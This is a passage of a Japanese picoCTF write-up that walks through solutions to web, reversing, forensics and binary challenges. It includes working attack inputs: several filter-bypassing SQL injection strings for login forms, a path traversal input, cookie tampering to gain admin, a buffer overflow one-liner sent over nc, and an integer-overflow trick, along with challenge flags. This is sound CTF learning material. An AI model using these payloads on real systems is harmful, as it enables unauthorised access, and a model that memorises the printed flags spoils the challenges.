                                if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
                                    alert(_0x4b5b('0x8'));
                                }
                            }
                        }
                    }
                }
            }
        }
    } else { alert(_0x4b5b('0x9')); }
}
```

まずDevToolを開き、コンソールでプログラムを実行することで、次の前提が得られる。

#### 1. `checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];`について

`_0x4b5b('0x0)`が`getElementById`、`_0x4b5b('0x1')`が`value`であるから、このコードは

```javascript
checkpass = document.getElementById('pass').value
```

を表す。
つまりフォームの内容が`checkpass`に入る。

#### 2. `if (checkpass[_0x4b5b('0x2')](引数1, 引数2) == 何か) { ...`について

`_0x4b5b('0x2')`が`substring`を表すので、これは

```javascript
if (checkpass.substring(引数1, 引数2) == 何か) { ...
```

を意味する。
つまり、`checkpass`の部分文字列がある文字列と等しいかを確認している。

これらの前提を踏まえた上で、いよいよif文の条件を順に調べていく。
なお、以下では**文字列の先頭文字を0文字目として表記する**。

1. `_0x4b5b('0x3')`は`picoCTF{`だから、checkpassの0~7文字目が`picoCTF{`か判定している。
2. 7~8文字目が`{n`かどうかの判定
3. `_0x4b5b('0x4')`は`not_this`なので、8~15文字目が`not_this`かどうかの判定
4. 3~5文字目が`oCT`かどうかの判定
5. `_0x4b5b('0x5')`は`0a029}`なので、24~31文字目が`0a029}`かどうか判定
6. 6~10文字目が`F{not`かどうかの判定
7. 16~23文字目が`_0x4b5b('0x6')`、つまり`_again_5`かどうかの判定
8. 12~15文字目が`_0x4b5b('0x7')`、つまり`this`かどうかの判定

これらの情報をもとにして、flagが得られる。というかほぼ答え言ってしまった。

（別解）
最初の配列

```javascript
var _0x5a46=['0a029}','_again_5','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this'];
```

だけ見て、それっぽい要素をいい感じにつなげるとflagができる。
白状すると、最初はこの方法で正解のflagを得たのだが、さすがに想定解ではなさそうだったので上記の通りちゃんと解きなおした。

### Power Cookie (web, 200)

ボタンを押した際に次の関数が実行される。

```javascript
function continueAsGuest()
{
  window.location.href = '/check.php';
  document.cookie = "isAdmin=0";
}
```

つまり、/check.phpに飛んでから、Cookieに"isAdmin=0"を設定している、

どうにかCookieに"isAdmin=1"などと設定できれば突破できそう。
そこでbutton要素を書き換え、

```html
<button type="button" onclick="continueAsGuest();document.cookie = 'isAdmin=1';">Continue as guest</button>
```

のようにした。その後ボタンを押したらflagが得られた。

### plumbling (general, 200)

`nc jupiter.challenges.picoctf.org 14291`などで接続すると、大量の文字列が流れる。この中からflagを探す必要があるのだが、人力で探すのは非効率的である。

そのため、たとえば`nc jupiter.challenges.picoctf.org 14291 > log.txt`などとして、吐かれた文字列を全部`log.txt`に記録してやる。そしてgrepを用いて`cat log.txt | grep picoCTF`とすれば、flagを簡単に見つけ出すことができる。

### Based (general, 200)

2進→8進→16進の順に数値が与えられるので、それをAsciiコードにしたがって文字列に変換していく問題。
制限時間が設けられており、全問を解くのに45秒しか与えられない。そのため人力ではすこし難しい。

pwntoolsを使ってみようとしたがなかなかうまくいかず断念。人力で解くことにする。

コマンド`python3`で対話型シェルを開き、以下コードを実行して8進、16進変換用関数を定義した。それらを使い、人力で解いた。

```python
import re

def fromOct(str):
 ans = ""
 s = str.split(" ")
 for i in s:
  ans += chr(int(i, 8))
 print(ans)

def fromHex(str):
 ans = ""
 for i in re.split('(..)', str)[1::2]:
  ans += chr(int(i, 16))
 print(ans)
```

pwntoolsを使う方法は以下リンクに書かれている。後で確認しようと思う。<https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Based.md>

参考:
<https://fabeee.co.jp/column/employee-blog/python_split/>
<https://qiita.com/8ayac/items/12a3523394080e56ad5a>
<https://hiziriai.hatenablog.com/entry/2017/09/18/124628>
<https://www.delftstack.com/ja/howto/python/convert-binary-to-int-python/>
<https://tryunoo.hatenablog.com/entry/2017/10/28/202151>
<https://note.nkmk.me/python-bin-oct-hex-int-format/>
<https://qiita.com/masakielastic/items/2a04aee632c62536f82c>

### vault-door-3 (rev, 200)

入力文字列の文字の配置を入れ替え、その文字列が用意された文字列と一致するかを判断している。

ということは、その入れ替え処理を逆順に行ってやれば、flagが得られるはずである。

逆に入れ替えるC++プログラム（以下に示す）を作成し、実行したところ、予想通りflagが得られた。

```cpp
#include <iostream>
#include <string>
using namespace std;

int main() {
 string str = "jU5t_a_sna_3lpm18g947_u_4_m9r54f";
 char ans[32];

 for (int i = 17; i <= 31; i += 2) {
  ans[i] = str[i];
 }

 for (int i = 30; i >= 16; i -= 2) {
  ans[46-i] = str[i];
 }

 for (int i = 15; i >= 8; --i) {
  ans[23-i] = str[i];
 }

 for (int i = 7; i >= 0; --i) {
  ans[i] = str[i];
 }

 printf("done!\n");
 printf("%s\n", ans);
}
```

（補足）
与えられたプログラムの入れ替え処理を手動でやってみた。

```txt
0
1
2
3
4
5
6
7
15 (=23-8)
14
13
12
11
10
9
8
30 (=46-16)
17
28
19
26
21
24
23
22
25
20
27
18
29
16
31
```

### Fresh Java (rev, 200)

radare2で解析する。といってもアセンブリを読むだけだが。

`r2`コマンドで起動し、`aaa`、`VV`、`q`でバイナリを読んでたら偶然flag文字列を発見した。

※解いたあとにヒントを見たら「javaのデコンパイラを使う」のが想定解だったらしい。
その場合、たとえば以下のようなオンラインデコンパイラを使うのが楽だと思う。

<https://jdec.app>

### bloat.py (rev, 200)

pythonプログラムが難読化されている。関数定義部分を除いた部分について考えると、

```python
arg444 = arg132() # flag.txt.encの中身
arg432 = arg232() # パスワード入力?
arg133(arg432)    # パスワードが正しいか判定?
arg112()          # 何かを出力
arg423 = arg111(arg444) # flag.txt.encをデコードしてarg122()に渡す処理
print(arg423)     # デコードしたflagを出力?
sys.exit(0)
```

と推測される。ここでパスワード判定処理を行っている（と思われる）関数`arg133()`を見てみると、

```python
def arg133(arg432):
  if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]:
    return True
  else:
    print(a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\
a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\
a[81]+a[68]+a[66]+a[83])
    sys.exit(0)
    return False
```

と書かれている。`arg432`は入力文字列なので、入力が`a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]`であればよいとわかる。

この文字列の難読化を解除すると、

```py
$  python3
Python 3.10.4 (main, Apr  2 2022, 09:04:19) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

>>> a = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ "
>>> a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]
'happychance'
```

となるから、パスワードとして`happychance`を入力すればよい。

### asm1 (rev, 200)

与えられたプログラムを読み取る。動作をコメントに記すと次のようになる（処理されない命令にはコメントをつけていない）。

```asm
asm1:
 <+0>: push   ebp             # ベースポインタをpush
 <+1>: mov    ebp,esp           # ベースポインタにスタックポインタを入れる
 <+3>: cmp    DWORD PTR [ebp+0x8],0x3fb  # PTR[ebp+0x8]は引数0x2e0っぽい? それと0x3fbの比較
 <+10>: jg     0x512 <asm1+37>      # greaterではないので飛ばない
 <+12>: cmp    DWORD PTR [ebp+0x8],0x280 # 0x2e0と0x280の比較
 <+19>: jne    0x50a <asm1+29>      # not equalなので飛ぶ <+29>に
 <+21>: mov    eax,DWORD PTR [ebp+0x8]
 <+24>: add    eax,0xa
 <+27>: jmp    0x529 <asm1+60>
 <+29>: mov    eax,DWORD PTR [ebp+0x8]  # eaxに0x2e0を代入
 <+32>: sub    eax,0xa          # eax - 0xa = 0x2e0 - 0x00a = 0x2d6
 <+35>: jmp    0x529 <asm1+60>      # <+60>に飛ぶ
 <+37>: cmp    DWORD PTR [ebp+0x8],0x559
 <+44>: jne    0x523 <asm1+54>
 <+46>: mov    eax,DWORD PTR [ebp+0x8]
 <+49>: sub    eax,0xa
 <+52>: jmp    0x529 <asm1+60>
 <+54>: mov    eax,DWORD PTR [ebp+0x8]
 <+57>: add    eax,0xa
 <+60>: pop    ebp            # ベースポインタを復元
 <+61>: ret               # return 戻り値はeaxに入っている
```

結局`eax`には`0x2d6`が入っているので、これが戻り値である。つまり`asm1(0x2e0)`の実行結果は`0x2d6`となる。

なお、問題文にもあるように、この問題は`picoCTF{...}`というflagフォーマットではないので注意する。答えをそのまま`0x2d6`と提出すればよい。

### Forbidden Paths (web, 200)

ディレクトリトラバーサルみたいに`../../../../flag.txt`を入力すればよい。

### Web Gauntlet (web, 200)

SQLインジェクションを行う問題だが、フィルターに引っかかる単語は使えない。5ラウンドに別れており、少しずつフィルターに載る単語が多くなっていく。
どの単語がフィルタリングされているかは<http://jupiter.challenges.picoctf.org:29164/filter.php>で確認できる。

1ラウンド目:
`or`が使えない。ユーザ名が`admin`なのは問題文からわかっているので、

- ユーザ名：`admin' and 1=1;--`
- パスワード：なんでもいい

とすればSQLiできる。

2ラウンド目:
`or`, `and`, `like`, `=`, `--`が使えない。いきなりフィルターが増えて困ったが、セミコロンで区切ってしまえばコメントアウトは必要内容に思えたので、

- ユーザ名：`admin';`
- パスワード：なんでもいい

としたら突破できた。

3ラウンド目:
追加で`<`, `>`が使えなくなったが、2ラウンド目と同じ方法が使えるため楽々突破。

4ラウンド目:
ついに`admin`も使用不可にされた。文字列の連結を用いて`ad' + 'min';`や`ad' || 'min';`としても通らない。
どうやっても無理だったので仕方なくwriteupを見ると、先ほどの`ad' || 'min';`で通っている人を発見。

<https://medium.com/@shaunak007/picogym-web-gauntlet-983b17732b3d>

よく見ると、その方の入力には空白が含まれていない。真似して`ad'||'min';`と入力したところ、なぜか突破できた。

5ラウンド目:
`union`も使えなくなった。しかし4ラウンド目の解法が利用できるため突破。

5ラウンド全部解くと、filter.phpに問題のソースとflagが表示される。
このソースを見て気づいたが、実は3ラウンド目から半角スペースが使用不可になっていたらしい。

補足：より詳しくはここに載っている。
<https://zacheller.dev/pico-web-gauntlet>

### Secrets (web, 200)

用意されたページに飛ぶ。securityなどの単語がたくさん書かれている画像をDevToolsで確認すると、`~/secret/`ディレクトリにあるとのこと、
そこに飛ぶと、今度はGIFが置かれたページに移動する。その画像の存在場所も同様に調べると、`~/secret/hidden/`にあるようだ。
さらにそこに移動すると、何らかのログインフォームが現れる。このページのcssファイル（`login.css`）がどこにあるか見ると、`~/secret/hidden/superhidden/`にある。
そこに飛ぶと、「Finally. You found me.」などと書かれたページに移動する。ソースを見るか、ページを全選択（ctrl+A）すればflagが見つかる。

### SQL Direct (web, 200)

端末にpostgreSQLが入っていなかったので`sudo apt install postgresql`でインストールした。その後picoCTF上でインスタンスを立ち上げ、そこに`psql`で接続する（インスタンス立ち上げ後に表示されるコマンドをコピペすればよい）。

参考文献を見ながら、最低限の操作方法について記す。
`\d`でデータベース全体を確認する（ざっくり言えば）。含まれるテーブル名がわかるので、`\d <テーブル名>`とすればテーブルの内容も確認できる。psql終了時は`\q`とする。
SQLのクエリについては一般的な記法で実行できるが、`SELECT ... FROM ... WHERE ...`のように、`SELECT`等については大文字で書かないとエラーとなるので注意（`select ... from ...`はエラー）。また文末にセミコロン`;`を忘れないようにする。

参考文献:

- <https://qiita.com/Shitimi_613/items/bcd6a7f4134e6a8f0621>
- <https://www.postgresql.jp/document/9.2/html/app-psql.html>

さて、実際に解いてみる。
まず`\d`でDBの情報を確認する。

```sql
pico-# \d
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)
```

`flags`という名前のテーブルがあるとわかったので、SQL文`SELECT * FROM flags;`を実行して全内容を表示させる。先述したようにセミコロンを忘れないこと。

```sql
pico=# SELECT * FROM flags;
 id | firstname | lastname  |                address
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{ここにflagが書かれている}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
(3 rows)
```

### buffer overflow 1 (binary, 200)

名前の通り、与えられたプログラムに不正な入力を行い、バッファオーバフローを起こす問題である。
バッファオーバフローについては、直近に参加したCTF(Hacker's Playground 2022)で紹介されていた資料がとてもわかりやすかったので、共有する。
<https://onedrive.live.com/embed?cid=F7E83213DDD289C7&resid=F7E83213DDD289C7!2326&authkey=AO--wL8NhffuNZw&em=2>

この問題も上記資料を参考にすれば解ける。簡単にいえば、

1. `vuln()`関数内で、`gets()`に規定を超えるサイズのデータを入力し
2. それによりバッファオーバフローを起こしreturn先アドレスを`main()`から`win()`に書き換え
3. `win()`関数を動作させることでflagを得る
という流れで解くことができる。

結局、以下コマンドを実行すれば解ける。

```python
python2 -c "print 'A'*(32+12) + '\xf6\x91\x04\x08'" | nc saturn.picoctf.net 59036
```

### Sleuthkit Apprentice (forensics, 200)

イメージファイルが与えられるので、例によってAutopsyでファイルシステムを覗けばよい。vol4の`/root/my_folder_flag.uni.txt`にある。

`picoCTF{by73_5urf3r_3497ae6b}`

### Pitter, Patter, Platters (forensics, 200)

`suspicious.dd.sda1`というファイルが与えられる。はじめて見た拡張子なので`file`で調べる。

```sh
$ file suspicious.dd.sda1
suspicious.dd.sda1: Linux rev 1.0 ext3 filesystem data, UUID=fc168af0-183b-4e53-bdf3-9c1055413b40 (needs journal recovery)
```

イメージファイルのようなので、例によってAutopsyで解析する。ファイルツリーを見ると`/img_suspicious.dd.sda1/suspicious-file.txt`というファイルがあった。しかしフラグは書かれていない。惜しいところまで来ている気がするが…

```txt
Nothing to see here! But you may want to look here -->
```

他のファイルも確認したが不自然な点は見当たらない。ヒントを見ると`slack space`について調べるように書かれていたので、検索をかける。

Linuxではファイルを複数のセクター（たいていは512byte）を用いて保存するが、その際に余った部分が出てくる。たとえば1000byteのファイルを保存するには2つのセクター（1024byte）を利用するが、この際に24byte余ってしまう。この部分をslack spaceと呼ぶ。
ファイルの削除が行われたあとにセクターが再利用される場合を考える。このとき、前回よりもslack spaceが大きければ、前回のファイルの内容が一部見えてしまう（図示すると以下のような感じ）。これを利用すると削除データの復元が可能である。

```txt
[元ファイルの中身]
hello world!

↓

[削除後、同じセクタに"byebye"という内容のファイルを保存]
byebyeworld! ← 後ろの"world!"が上書きされず残っている
```

Autopsyにもslack spaceを解析するためのツールがあるので、使ってみる。ツール→オプション→表示→「次のスラックファイルを非表示にする」の2つのチェックを外すと、スラックファイルがファイルツリーに表示されるようになる。こうして表示されるようになったファイル`/img_suspicious.dd.sda1/suspicious-file.txt-slack`にflagがある。

`picoCTF{b3_5t111_mL|_<3_b945d7b6}`

### Flags (crypto, 200)

「アルファベット 旗」で調べると「国際信号旗」がヒットする。

<https://ja.wikipedia.org/wiki/%E5%9B%BD%E9%9A%9B%E4%BF%A1%E5%8F%B7%E6%97%97>

これを用いて1文字ずつ暗号を解読していけば良い。なお数字についてはNATO旗を参照して解読する必要がある。

`PICOCTF{F1AG5AND5TUFF}`

### Roboto Sans (web, 200)

わからなかったのでwriteupを見た。`robots.txt`を確認するとBase64エンコードされた文字列が書かれているので、これをデコードすると`js/myfile.txt`という文字列が確認できる。ここにアクセスするとflagが書かれている。

`picoCTF{Who_D03sN7_L1k5_90B0T5_22ce1f22}`

### RPS (binary, 200)

じゃんけんに5回連続で勝つとflagが得られるゲーム。ソースコードの100行目で勝敗判定が行われているが、これはプレイヤーの入力`player_turn`に、コンピュータの手に勝つ手が含まれていれば勝利という処理である。以下に該当部分のソースコードを示す。

```c
  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
```

この処理のおかげで、`player_turn`に`rock/paper/scissors`という文字列が入っている場合は相手の手にかかわらず勝利することができる。これを利用すればflagが得られる。

```txt
$ nc saturn.picoctf.net 51776
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rock/paper/scissors
rock/paper/scissors
You played: rock/paper/scissors
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1

（中略）

Please make your selection (rock/paper/scissors):
rock/paper/scissors
rock/paper/scissors
You played: rock/paper/scissors
The computer played: paper
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
Type '1' to play a game
Type '2' to exit the program
```

## 250pt

### asm2 (rev, 250)

asm1と同様だが、ループ処理が入るので面倒。
説明の前にコメント付きで処理内容を示す。

```asm
asm2:
 <+0>: push   ebp             # ベースポインタをスタックに積む
 <+1>: mov    ebp,esp           # ebpにスタックポインタを入れる(ebpがこの時点でのスタックの一番上を指す)
 <+3>: sub    esp,0x10           # espから0x10引く(4つ上のレジスタを指す)
 <+6>: mov    eax,DWORD PTR [ebp+0xc]   # eaxにebpの指す3つ下のデータ(引数2, 0x2d)を入れる
 <+9>: mov    DWORD PTR [ebp-0x4],eax   # ebpの指す1つ上のレジスタにeax(0x2d)を入れる
 <+12>: mov    eax,DWORD PTR [ebp+0x8]  # eaxにebpの指す2つ下のデータ(引数1, 0x4)を入れる
 <+15>: mov    DWORD PTR [ebp-0x8],eax  # ebpの指す2つ上のレジスタにeax(0x4)を入れる
 <+18>: jmp    0x50c <asm2+31>      # <+31>に無条件ジャンプ

 <+31>: cmp    DWORD PTR [ebp-0x8],0x5fa1 # ebpの指す2つ上のレジスタの内容(0x4)と0x5fa1を比較
 <+38>: jle    0x501 <asm2+20>      # less than or equal to なので<+20>にジャンプ

 <+20>: add    DWORD PTR [ebp-0x4],0x1  # ebpの指す1つ上のレジスタの内容(0x2d)に0x1を足す、PTR[ebp-0x4] = 0x2e
 <+24>: add    DWORD PTR [ebp-0x8],0xd1  # ebpの指す2つ上のレジスタの内容(0x4)に0xd1を足す、PTR[ebp-0x8] = 0xd5
 <+31>: cmp    DWORD PTR [ebp-0x8],0x5fa1 # ebpの指す2つ上のレジスタの内容(0xd5)と0x5fa1を比較
 <+38>: jle    0x501 <asm2+20>      # less than or equal to なので<+20>にジャンプ

(略)

 <+20>: add    DWORD PTR [ebp-0x4],0x1  # ebpの指す1つ上のレジスタの内容に0x1を足す、PTR[ebp-0x4] = 0xa3
 <+24>: add    DWORD PTR [ebp-0x8],0xd1  # ebpの指す2つ上のレジスタの内容に0xd1を足す、PTR[ebp-0x8] > 0x5fa1
 <+31>: cmp    DWORD PTR [ebp-0x8],0x5fa1 # ebpの指す2つ上のレジスタの内容と0x5fa1を比較
 <+38>: jle    0x501 <asm2+20>      # greater than なのでジャンプしない

 <+40>: mov    eax,DWORD PTR [ebp-0x4]  # eaxにPTR[ebp-0x4] = 0xa3を入れる
 <+43>: leave               # ベースポインタの復元などをしているらしい
 <+44>: ret               # return
```

やっている事自体は簡単で、

1. 引数1に`0xd1`を足しながら、足した回数Nをカウント
2. 引数1が`0x5fa1`を超えたらループ終了。そうでなければ1に戻る
3. 引数2にNを足した値を戻り値として返却し、終了

という処理である。

つまり今回は、
$$
0x4 + N \times 0xd1 > 0x5fa1
$$
となる最小のNを求め、それを`0x2d`と足したものが戻り値=この問題の答えとなる。

この不等式を解けば`N = 118(10進数) = 0x76`とわかるから、戻り値は`0x2d + 0x76 = 0xa3`である。
flag形式はasm1と同じく、`0xa3`と提出すればよい。

### vault-door-4 (rev, 250)

ASCIIコードを文字に変換するだけである。

1つ注意点。
Pythonで変換コードを書く場合、8進数は先頭に`0o`をつけて表現するので、たとえば`071`は`0o71`と書き直す必要がある。

### like1000 (forensics, 250)

`1000.tar`というファイルが与えられるが、これを展開（圧縮されてないので「解凍」ではない）すると`999.tar`が手に入る。問題文からも1000回展開を繰り返す問題だと推測できたため、シェルスクリプトを組んで自動で展開させる。

```sh
for data in `seq 1000 -1 1`
do
  tar -xf $data.tar
  rm $data.tar
done
```

数分待つと展開が終わり、`flag.png`が得られた。

`picoCTF{l0t5_0f_TAR5}`

## 300pt

### SQLiLite (web, 300)

SQLiを行いログインしたのち、ソースコードを見るとflagが書かれている。

### Irish-Name-Repo 1 (web, 300)

ページのソースを見ると`login.html`があることがわかるためそこに移動（いま気づいたが左のハンバーガメニューをクリックして出てくる`Admin Login`からでもいける）。
その後手がかりがなく困ったが、`debug`という名前の怪しげなフォームが隠されていることに気づく。DevToolで`type="hidden"`を強制的に消してフォームを出現させ、適当に1を入れてLoginボタンを押すと、ログイン失敗画面の上側にSQLクエリが表示された。
SQLインジェクションを使用することが予想できたので、あとはUsernameに`' OR 1 = 1 --`みたいに書いてやればログインできる。パスワードには何も入力しなかった。

### mus1c (general, 300)

歌詞が与えられる。歌詞が何らかのプログラムに見える（put intoで変数に代入してそう、buildでDB関係の処理をしてそう）が、調べてもなかなか見つからない。

ヒントを見ると`rockster`というプログラミング言語が使用されているようだ。

<https://codewithrockstar.com>

公式サイトにプログラムを実行できるページがあるため、これを用いて実行してみる。

<https://codewithrockstar.com/online>

実行結果は以下の通り。
なお、上記ページで実行した際に最後に出力される`Program completed ~`の文は省いた。

```txt
114
114
114
111
99
107
110
114
110
48
49
49
51
114
```

ASCIIコードと思われるので、これを適当なファイルに保存し、次に示す変換プログラムを実行してやるとflagが出てくる。

```python
with open("output.txt", "r") as f: # output.txtはさっきの実行結果
        lines = f.readlines()

flag = "picoCTF{"

for l in lines:
        flag += chr(int(l))

flag += "}"

print(flag)
```

### flag_shop (general, 300)

ソースコードを見ると、このプログラムは以下のように遷移する。

```txt
最初の所持金は1100ドル

↓

(1)所持金表示 (2)flagを買う (3)終了 の中から１つ選ぶ

↓ (2)を選んだ時

[1]900ドルで虚無を買う [2]100000ドルでflagを買う から選ぶ

[1]
買う数を入力し、所持金から(買う数 x 900ドル)を引く。
(買う数 x 900ドル)が所持金より多ければ拒否される。
また買う数が自然数(1以上の整数)でない場合も拒否される。

[2]
1つだけ買える。
所持金が100000ドル以上ならflagを表示する。そうでなければ拒否される。
```

つまるところ、所持金が100000ドル以上あればいいのだが、最初の所持金が1100ドルである以上。その状況にはなりえないように思える。

しかし、1つ抜け道がある。（買う数×900ドル）をオーバーフローさせ、負数にすればよいのである。
そうすれば所持金から負数を引く＝所持金が増えることになるため、flagを購入できるようになる。

所持金も買う数もint型（-2147483648 ~ 2147483647）の変数で管理されているため、（買う数×900）をオーバーフローさせるには2386095個以上（#）買えばよい。
そうすれば莫大な富が手に入るので、flagを容易に購入できるようになる。

（#）2147483647を単純に900で割って切り上げれば2386093個買うことになるが、もともと所持金が1100ドルあるため、購入後の所持金は`1100 - (2386093 x 900) = 1100 - (-2147483596) = 2147484696 = -2147482600`となり結局負数になってしまう。こうなってしまうと積む。
そのため初期所持金1100ドルを考慮して2個（1800ドル）以上余計に買う必要がある。

### vault-door-5 (rev, 300)

ダウンロードしたjavaプログラムでは、入力をURLエンコードしてからさらにbase64でエンコードし、その文字列を正しいものと比較する処理が行われている。
そのため、これを逆順に行えばよい。

まずプログラム中の文字列`JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVmJTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2JTM0JTVmJTY1JTMzJTMxJTM1JTMyJTYyJTY2JTM0`をbase64でデコードすると、以下の結果が得られた。

```sh
$ echo "JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVmJTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2JTM0JTVmJTY1JTMzJTMxJTM1JTMyJTYyJTY2JTM0" | base64 -d
%63%30%6e%76%33%72%74%31%6e%67%5f%66%72%30%6d%5f%62%61%35%65%5f%36%34%5f%65%33%31%35%32%62%66%34
```

次にこの出力をURLデコードする。といっても`%`区切りで16進数が並んでいるだけなので、Pythonでは`String.split("%")`で分割し、それを`chr(int("16進数", 16))`で文字に直せばよい。

```python
urlen = "%63%30%6e%76%33%72%74%31%6e%67%5f%66%72%30%6d%5f%62%61%35%65%5f%36%34%5f%65%33%31%35%32%62%66%34"
hexes = urlen.split("%")
hexes.pop(0) # %で区切るとhexes[0]に空文字列が入ってしまうため、それを除去

# 各要素の先頭に0xを付与 これで16進数として扱える
for i in range(len(hexes)):
  hexes[i] = "0x" + hexes[i]

# あとは普通に文字に変換
ans = "picoCTF{"
for h in hexes:
  ans += chr(int(h, 16))
ans += "}"

print(ans)
```

### Bbbbloat (rev, 300)

正しい数字を入力するとflagが出力される問題か。
radare2で解析する。

おそらく0x000014d0番地の`jne 0x1583`で入力の正誤判定をしている気がする（飛ぶ先が`thats it not`というメッセージなので）。
となるとその直前が怪しい。

直前で`cmp eax, 0x86187`が実行されており、`eax`には入力が入っている（アドレス`0x00001476`の命令`mov eax, dword [var_3ch]`を見てなんとなくそう感じた）と思われる。
そのため、入力が`0x86187`、つまり10進数の`549255`であればよいと推測される。

そんなうまくいくかと思ったが、その通り入力したらflagが得られた。

### unpackme (rev, 300)

UPXでパックされているので、`upx -d <ファイル名>`でアンパックする。

それ以降は上の問題`Bbbbloat`と同じ。radare2で解析すると、アドレス`0x00401ef8`の`cmp eax, 0xb83cb`で入力の正誤判定が行われているので、今回は`0xb83cb` = 10進数の`754635`を入力すればflagが得られる。

### St3g0 (forensics, 300)

画像ファイルが与えられる。`file`や`strings`、`binwalk`で異常が見つからない。Bit Plane（LSB）ではないかと推測して<https://www.aperisolve.com>に投げたところ、その通りであった。`zsteg`コマンドの実行結果、`b1,rgb,lsb,xy`の行にflagがあった。

`picoCTF{7h3r3_15_n0_5p00n_a9a181eb}`

### Eavesdrop (forensics, 300)

プロトコル階層を見ると、Dataのパケットが多く含まれているとわかる。試しにフィルターに`data`を指定してみると、2人による会話が見つかった。適当なパケットを右クリックして「追跡」を選択すると、メッセージだけを抜き出すことができる。

```txt
Hey, how do you decrypt this file again?
You're serious?
Yeah, I'm serious
*sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
Ok, great, thanks.
Let's use Discord next time, it's more secure.
C'mon, no one knows we use this program like this!
Whatever.
Hey.
Yeah?
Could you transfer the file to me again?
Oh great. Ok, over 9002?
Yeah, listening.
Sent it
Got it.
You're unbelievable
```

後半で暗号化されたファイルを再度送信していることがわかるので、「Yeah, listening.」と「Sent it」の間のパケットを見てみる。すると`9002`ポート宛に何らかのデータを送信しているパケットがあった（No.57）。このパケットのData部分を右クリックして「パケットバイト列をエクスポート」で保存し、会話中にある復号コマンドで復号を試みる。

```sh
$ cat sent.bin
Salted__<K&��,J�����o�
                      %��I{97����.凞
$ openssl des3 -d -salt -in sent.bin -out file.txt -k supersecretpassword123
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
$ cat file.txt
picoCTF{nc_73115_411_0ee7267a}
```

うまく復号でき、flagが得られた。

`picoCTF{nc_73115_411_0ee7267a}`

## 350pt

### 1_wanna_b3_a_r0ck5tar (general, 350)

300ptの`mus1c`と同様の問題。以下、与えられた歌詞。

```rockstar
Rocknroll is right
Silence is wrong
A guitar is a six-string
Tommy's been down
Music is a billboard-burning razzmatazz!
Listen to the music
If the music is a guitar
Say "Keep on rocking!"
Listen to the rhythm
If the rhythm without Music is nothing
Tommy is rockin guitar
Shout Tommy!
Music is amazing sensation
Jamming is awesome presence
Scream Music!
Scream Jamming!
Tommy is playing rock
Scream Tommy!
They are dazzled audiences
Shout it!
Rock is electric heaven
Scream it!
Tommy is jukebox god
Say it!
Break it down
Shout "Bring on the rock!"
Else Whisper "That ain't it, Chief"
Break it down
```

歌詞をrockstarプログラムとして実行すると、`Rock is electric heaven`の部分でエラーが出る。

公式のドキュメントを見ると、どうやら`Rock`という単語が予約語らしく、そのせいでエラーが出ているようだ。
後述するが、この変数名を変えてもとくに問題はないため、適当に`Rock`以外の名前に変えておく。

さて、プログラム内容をドキュメントを見ながらPython風のコードに直すと、以下のようになった。

```python
# rightはtrueを意味する
Rocknroll = true
# silenceは空文字列、wrongはfalseを意味する
"" = falce

# 先ほどのrightやwrongといった特別な文字列以外を変数に代入すると、
# その文字列はPoetic Number Literalsとして扱われ、
# 代入時には数値に変換される(詳しくはドキュメント参照)。
A_guitar = 10 # "a six-string"をPoetic Number Literalsとして扱うと10
Tommy = 44 # 同様に"been down"は44
Music = 170 # "a billboard-burning razzmatazz!"は170(!など、アルファベット以外の文字は文字数にカウントしない。ただしハイフンを除く)

# listenで入力を受け付ける
the_music = STD_IN

if (the_music == a_guitar): # 入力が10なら
  print("Keep on rocking!")

  the_rhythm = STD_IN

  # withoutは減算, nothingはnullや0を意味する
  if (the_rhythm - Music == 0):  # 入力が170なら
    Tommy = 66
    print(Tommy)  # おそらく文末の!は無視する
    Music = 79
    Jamming = 78
    print(Music)
    print(Jamming)
    Tommy = 74
    print(Tommy)
    Tommy = 79 # Theyは直前に出た変数を示す？
    print(Tommy) # itも直前の変数を示す?
    Rock = 86 # 先述のエラー発生箇所。変数名を適当に変える必要あり
    print(Rock)
    Tommy = 73
    print(Tommy)
    break
    print("Bring on the rock!")
  else:
    print("That ain't it, Chief")
    break
```

このコードより、標準入力に10と170を渡せば、望む出力が得られるとわかる。
[公式の実行ページ](https://codewithrockstar.com/online)では、`Input`と書かれた場所に、渡したい値を入力すればよい。2つ以上の値を渡す場合は改行で区切る。

その結果、以下の出力が得られた。

```txt
Keep on rocking!
66
79
78
74
79
86
73
Program completed in 46 ms
```

これらの数をASCII文字コードに則り文字に直せば、flagが得られる。

### Irish-Name-Repo 2 (web, 350)

